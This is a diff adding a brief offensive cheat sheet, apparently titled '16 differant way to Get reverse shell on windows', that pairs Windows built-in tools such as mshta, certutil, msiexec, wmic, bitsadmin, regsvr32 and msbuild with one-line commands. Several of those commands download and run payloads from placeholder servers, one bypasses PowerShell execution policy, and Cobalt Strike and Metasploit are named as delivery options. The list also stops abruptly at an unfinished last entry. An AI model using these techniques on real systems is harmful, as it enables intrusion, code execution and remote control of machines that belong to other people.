@@ -1,0 +1,18 @@
+                    16 differant way to Get reverse shell on windows 
+ ===================================================================================================================
+	Mshta.exe                : mshta javascript:alert('test');
+	csc.exe                  :C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /out:payload.exe payload.cs
+	Rundll32.exe             :rundll32 SHELL32.DLL,ShellExec_RunDLL "calc"
+	Regsvr32.exe             :regsvr32 payload.dll 
+	cscript.exe/wscript.exe  :cscript.exe test.vbs
+	Certutil.exe             :certutil -urlcache -split -f [URL] [output-file]
+	Powershell.exe           :powershell -exec bypass -File test.ps1
+	Msiexec.exe              :msiexec /i http://server/package.msi       msiexec /y payload.dll
+	msbuild.exe              :C:\Windows\Microsoft.NET\Framework\v2.0.50727\msbuild.exe \server\payload
+	Wmic.exe                 :wmic os get /format:"https://server/payload.xsl"
+	Web Delivery             :cobalt strike or metasploit
+	control.exe              :control.exe payload.dll
+	bitsadmin                :bitsadmin /transfer [job-name] /download /priority normal [URL-to-payload] [output-path]
+	forfiles.exe             :forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe
+	winrm.exe                :winrm qc -q & winrm i c wmicimv2/Win32_Process @{CommandLine="calc"}
+	Batch File
